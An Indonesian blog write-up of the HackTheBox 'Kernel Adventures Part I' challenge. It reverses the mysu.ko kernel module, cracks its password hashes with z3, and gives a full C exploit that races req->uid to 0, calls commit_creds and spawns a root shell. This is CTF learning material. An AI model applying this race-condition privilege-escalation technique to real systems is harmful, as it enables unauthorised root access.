@@ -1,0 +1,368 @@
+<p><a href="/">Abdullah</a></p>
+
+<p><a href="/about/">About</a></p>
+
+<h1 id="kernel-adventures-part-i-suid-binaries-are-too-vulnerable-so-i-decided-to-implement-su-in-the-kernel">Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel.</h1>
+
+<p>Aug 26, 2022</p>
+
+<p>Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge <a href="www.hackthebox.com">hackthebox</a>. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.</p>
+
+<p>Spoiler alert! karena instance dari challenge ini masih aktif.</p>
+
+<h2 id="0x01-overview">0x01 Overview</h2>
+
+<p>Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>release/
+├── bzImage
+├── notes.txt
+├── rootfs.cpio.gz
+└── run.sh
+</code></pre></div></div>
+
+<p>Penjelasan singkat mengenai file-file diatas:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">bzImage</code> image kernel yang digunakan untuk booting ke sistem operasi. Didalam file ini juga terdapat binary kernel atau biasa disebut <code class="language-plaintext highlighter-rouge">vmlinux</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">rootfs.cpio.gz</code> berisi filesystem image untuk sistem operasi challenge ini.</li>
+  <li><code class="language-plaintext highlighter-rouge">run.sh</code> bash script yang digunakan untuk menjalankan sistem operasi.</li>
+</ul>
+
+<p>Yang perlu diperhatikan pada kasus ini adalah <code class="language-plaintext highlighter-rouge">rootfs.cpio.gz</code> karena disinilah file kernel module disimpan yang nantinya akan di-insert ke linux kernel menggunakan <code class="language-plaintext highlighter-rouge">insmod</code>.</p>
+
+<h3 id="extracting-linux-image-filesystem">Extracting Linux Image Filesystem</h3>
+
+<p>Ekstraksi filesystem dari image dapat menggunakan perintah <code class="language-plaintext highlighter-rouge">cpio</code> yang ada di-bash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gunzip rootfs.cpio.gz &amp;&amp; mkdir files
+$ cd files/
+$ cpio -idmv &lt; ../rootfs.cpio 
+...
+$ ls
+bin  etc   home  lib    linuxrc  mnt      opt   root  sbin  tmp  var
+dev  flag  init  lib64  media    mysu.ko  proc  run   sys   usr
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">init</code> adalah file yang akan dieksekusi pertama kali setelah proses booting selesai. <code class="language-plaintext highlighter-rouge">mysu.ko</code> ini adalah kernel module yang ditambahkan pada kernel. Untuk membaca <code class="language-plaintext highlighter-rouge">flag</code> diperlukan akses root yang bisa didapatkan dengan meng-eksploitasi kernel module <code class="language-plaintext highlighter-rouge">mysu.ko</code>. Lainnya adalah filesystem biasa yang terdapat pada linux.</p>
+
+<h3 id="kernel-module-structure">Kernel Module Structure</h3>
+
+<p>Pada kernel module terdapat 2 fungsi utama yaitu <code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_init</code> dan <code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_exit</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_init</code> ini akan dieksekusi ketika module di-load ke kernel.</li>
+  <li><code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_exit</code> ini akan dieksekusi ketika module di-unload dari kernel.</li>
+</ul>
+
+<p>Fungsi lain yang digunakan untuk berinteraksi antara kernel dengan user biasanya berawalan dengan <code class="language-plaintext highlighter-rouge">dev_*</code>, sebagai contoh <code class="language-plaintext highlighter-rouge">dev_open</code>, <code class="language-plaintext highlighter-rouge">dev_read</code>, dan <code class="language-plaintext highlighter-rouge">dev_write</code>. Dan ketiganya terdapat pada kernel module <code class="language-plaintext highlighter-rouge">mysu</code>.</p>
+
+<h2 id="0x02-reversing-kernel-module">0x02 Reversing Kernel Module</h2>
+
+<p>Dilihat dari <code class="language-plaintext highlighter-rouge">mysu_init</code>, kernel module akan membuat device pada <code class="language-plaintext highlighter-rouge">/dev/mysu</code> yang nantinya bisa digunakan untuk berinteraksi dengan user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int hash(const char *password)
+{
+    ...
+    idx = 0;
+    res = 0;
+    password_size = strlen(password);
+    while ( idx != password_size )
+    {
+        tmp = 1025 * (password[idx] + res);
+        res = password[idx++] ^ (tmp &gt;&gt; 6) ^ tmp;
+    }
+    return (unsigned int)res;
+}
+</code></pre></div></div>
+
+<p>Fungsi <code class="language-plaintext highlighter-rouge">hash</code> melakukan kalkulasi per-byte password dengan operasi add, mult, shift, dan xor.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int dev_read(__int64 a1, void *user_buf, unsigned __int64 user_copy_size)
+{
+    ...
+    n = user_copy_size;
+    if ( user_copy_size &gt; 0x20 )
+        n = 0x20;
+    memcpy(user_buf, &amp;users, n);
+    return n;
+}
+</code></pre></div></div>
+
+<p>Fungsi <code class="language-plaintext highlighter-rouge">dev_read</code> meng-copy <code class="language-plaintext highlighter-rouge">&amp;users</code> ke <code class="language-plaintext highlighter-rouge">user_buf</code> sebanyak <code class="language-plaintext highlighter-rouge">user_copy_size</code> dan panjang request copy tidak bisa lebih dari 32. <code class="language-plaintext highlighter-rouge">&amp;users</code> ini berisi <code class="language-plaintext highlighter-rouge">uid</code> dan <code class="language-plaintext highlighter-rouge">hash</code> dari users dan admin.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int dev_write(__int64 a1, req_s *req, unsigned __int64 user_write_size)
+{
+    ...
+    if ( user_write_size &lt;= 7 )
+        return NULL;
+    
+    if ( req-&gt;uid == users.uid )
+    {
+        password = req-&gt;password;
+        if ( hash(req-&gt;password) == users.hash )
+            goto SUCCESS;
+        if ( admin.uid != req-&gt;uid )
+            return NULL;
+    }
+    else if ( admin.uid != req-&gt;uid )
+    {
+        return NULL;
+    }
+
+    password = req-&gt;password;
+    
+    if ( hash(req-&gt;password) != admin.hash )
+        return NULL;
+    
+    SUCCESS:
+    uid = req-&gt;uid;
+    ptr = prepare_creds(password);
+    *(_DWORD *)(ptr +  4) = uid;
+    *(_DWORD *)(ptr +  8) = uid;
+    *(_DWORD *)(ptr + 12) = uid;
+    *(_DWORD *)(ptr + 16) = uid;
+    *(_DWORD *)(ptr + 20) = uid;
+    *(_DWORD *)(ptr + 24) = uid;
+    *(_DWORD *)(ptr + 28) = uid;
+    *(_DWORD *)(ptr + 32) = uid;
+    commit_creds(ptr);
+    return user_copy_size;
+}
+</code></pre></div></div>
+
+<p>Fungsi <code class="language-plaintext highlighter-rouge">dev_write</code> melakukan perbandingan <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> dan <code class="language-plaintext highlighter-rouge">req-&gt;password</code>’s hash, apakah request user merupakan <code class="language-plaintext highlighter-rouge">users</code> (uid: 1000) atau <code class="language-plaintext highlighter-rouge">admin</code> (uid: 1001). Jika semua pengecekan dapat lolos, maka kernel akan memanggil <code class="language-plaintext highlighter-rouge">commit_creds</code> dengan <code class="language-plaintext highlighter-rouge">cred-&gt;uid = req-&gt;uid</code>.</p>
+
+<p>Jika dilihat pada program, kita tidak bisa mengirim request dengan uid 0. Karena pengecekan hanya mengecek apakah user merupakan <code class="language-plaintext highlighter-rouge">users</code> atau <code class="language-plaintext highlighter-rouge">admin</code>. Jika tidak keduanya maka return null.</p>
+
+<h3 id="bug">Bug</h3>
+
+<p>Jika dilihat pada <code class="language-plaintext highlighter-rouge">dev_write</code> setelah seluruh pengecekan selesai, <code class="language-plaintext highlighter-rouge">user-&gt;uid</code> akan di-fetch ke variable lokal <code class="language-plaintext highlighter-rouge">uid</code> dan akan digunakan untuk meng-assign value uid, gid, dll. dari <code class="language-plaintext highlighter-rouge">struct cred</code> sebagai argument untuk memanggil <code class="language-plaintext highlighter-rouge">commit_creds</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ( req-&gt;uid == users.uid )
+{
+    password = req-&gt;password;
+    if ( hash(req-&gt;password) == users.hash )
+        goto SUCCESS;
+    if ( admin.uid != req-&gt;uid )
+        return NULL;
+}
+else if ( admin.uid != req-&gt;uid )
+    return NULL;
+
+password = req-&gt;password;
+if ( hash(req-&gt;password) != admin.hash )
+    return NULL;
+
+SUCCESS:
+uid = req-&gt;uid; // fetch
+</code></pre></div></div>
+
+<p>Bagaimana jika setelah pengecekan user yang valid selesai, lalu kita mengubah nilai dari <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> tadi pada thread lain? Ini akan menimbulkan inconsistency yang bisa kita manfaatkan untuk mendapatkan <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<h2 id="0x03-exploitation">0x03 Exploitation</h2>
+
+<p>Jika dilihat dari notes.txt,</p>
+
+<blockquote>
+  <p>“I removed the password hashes in the file I gave you. They’re not supposed to be 0.”</p>
+</blockquote>
+
+<p>Author telah menghapus password hash user valid yang terdapat pada <code class="language-plaintext highlighter-rouge">mysu.ko</code> yang diberikan tadi. Maka diperlukan read terlebih dahulu di-server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define MAX_SIZE 4
+
+int main(int *argc, const char **argv[]) {
+    int fd;
+    int buf[MAX_SIZE];
+
+    fd = open(DEVICE_PATH, O_RDWR);
+    if (fd &lt; 0) {
+        fprintf(stderr, "%s: failed open the device.\n", *argv);
+        exit(EXIT_FAILURE);
+    }
+
+    read(fd, &amp;buf, sizeof(buf));
+
+    for(int i = 0; i &lt; MAX_SIZE; i++)
+        printf("[%02x]: %08x (%d)\n", i, buf[i], buf[i]);
+    
+    return 0;
+}
+</code></pre></div></div>
+
+<p>Jalankan pada server akan didapatkan <code class="language-plaintext highlighter-rouge">uid</code> dan <code class="language-plaintext highlighter-rouge">hash</code> password dari <code class="language-plaintext highlighter-rouge">users</code> dan <code class="language-plaintext highlighter-rouge">admin</code> yang valid.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ /tmp/hax
+[00]: 000003e8 (1000)
+[01]: 03319f75 (53583733)
+[02]: 000003e9 (1001)
+[03]: 2ab76467 (716661863)
+</code></pre></div></div>
+
+<h3 id="cracking-hash-password">Cracking Hash Password</h3>
+
+<p>Tidak tau kenapa, z3 tidak menyelesaikannya secara optimal, sehingga dibutuhkan double check terhadap password yang didapatkan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from z3 import *
+
+max_uint = 0xFFFFFFFF
+max_int  = 0x80000000
+
+def hash(s):
+    res = 0
+    for i in range(len(s)):
+        tmp = (1025 * (s[i] + res)) &amp; max_uint
+        res = (s[i] ^ (tmp &gt;&gt; 6) ^ tmp) &amp; max_uint
+        res = res | (-(res &amp; max_int))
+    return res
+
+target = 0x03319f75 # users 
+target = 0x2ab76467 # admin
+length = 8          # increase if there is no solution by z3.
+
+s = Solver()
+b = [BitVec(f'b!{i}', 32) for i in range(length)]
+
+for i in range(len(b)):
+    s.add(And(b[i] &gt; 0x20, b[i] &lt; 0x7f))
+
+s.add(hash(b) == target)
+ 
+while s.check() == sat:
+    m = s.model()
+    p = bytes([m[i].as_long() for i in b])
+    
+    s.add(
+        Or(
+            b[0] != p[0],
+            b[1] != p[1],
+            b[2] != p[2],
+            b[3] != p[3],
+            b[4] != p[4]
+        )
+    )
+    
+    if hash(p) == target:
+        print(f"[valid] ({p.hex()}) -&gt; {p}\n")
+</code></pre></div></div>
+
+<h3 id="attack-ideas">Attack Ideas</h3>
+
+<p>Kita dapat mengubah <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> di-thread lain. Sehingga pada saat pengecekan <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> yang awalnya merupakan uid user biasa dan pengecekan hash password selesai, nilai <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> akan kita ubah menjadi uid root yang nantinya ini akan di-fetch ke variable lokal uid dan digunakan untuk assign <code class="language-plaintext highlighter-rouge">cred</code> struct untuk <code class="language-plaintext highlighter-rouge">commit_creds</code>. Sebagai gambaran alur prosesnya.</p>
+
+<p>Other Thread</p>
+
+<p>Main Thread</p>
+
+<p>…</p>
+
+<p>req-&gt;uid user valid check</p>
+
+<p>…</p>
+
+<p>req-&gt;password hash valid check</p>
+
+<p>set req-&gt;uid into 0 (root uid)</p>
+
+<p>uid = req-&gt;uid</p>
+
+<p>…</p>
+
+<p>cred-&gt;uid = 0 and others</p>
+
+<p>…</p>
+
+<p>commit_creds(cred) will give us root</p>
+
+<p>Untuk mengoptimalkan exploit dapat dilakukan race condition untuk mengubah user uid ke root uid, dan break jika sudah mendapatkan root privileged.</p>
+
+<p>Full exploit,</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+
+#define _GNU_SOURCE
+#define DEVICE_PATH     "/dev/mysu"
+#define USER_UID        1000
+#define ADMIN_UID       1001
+#define USER_PASSWORD   "UeS6Lsp("
+#define ADMIN_PASSWORD  "pYH4f5Rb"
+
+struct req_cred_s {
+    int uid;
+    char password[28];
+} req;
+
+void *race_thread() {
+    for (;;) req.uid = 0;
+}
+
+int main(int *argc, const char **argv[]) {
+    pthread_t t_id;
+    int fd;
+    
+    fd = open(DEVICE_PATH, O_RDWR);
+    
+    if (fd &lt; 0) {
+        fprintf(stderr, "failed open the device.\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    memcpy(req.password, ADMIN_PASSWORD, sizeof(ADMIN_PASSWORD));
+    
+    pthread_create(&amp;t_id, NULL, race_thread, NULL);
+    
+    for (;;) {
+        req.uid = ADMIN_UID;
+
+        write(fd, &amp;req, sizeof(req));
+
+        if (getuid() == 0) {
+            system("/bin/sh");
+            break;
+        }        
+    }
+   
+    return 0;
+}
+</code></pre></div></div>
+
+<p>Jalankan di-server dan root didapatkan :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+...
+/ $ /tmp/hax
+/ # id
+uid=0(root) gid=0(root) groups=1000(user)
+...
+/ # cat /flag
+HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
+/ # 
+</code></pre></div></div>
+
+<h2 id="0x04-penutup">0x04 Penutup</h2>
+
+<p>Pada awalnya bingung dengan multithread di <code class="language-plaintext highlighter-rouge">C</code> karena agak aneh diawal karena thread tidak jalan bersamaan, ternyata ada yang salah dikode aku. Great challenge! buatku yang baru pertama kali mengerjakan soal kernel exploitation.</p>
+
+<p>Thanks.</p>
+
+<p><a href="/2022/08/26/kern-adv-part-1.html"></a></p>
+
+<h2 id="abdullah">Abdullah</h2>
+
+<ul>
+  <li>Abdullah</li>
+  <li>
+    <p><a href="mailto:0x4bd2@gmail.com">0x4bd2@gmail.com</a></p>
+  </li>
+  <li><a href="https://github.com/abdullahnz">abdullahnz</a></li>
+  <li><a href="https://www.twitter.com/oxabdz">oxabdz</a></li>
+</ul>
+
+<p>:helloworld:</p>
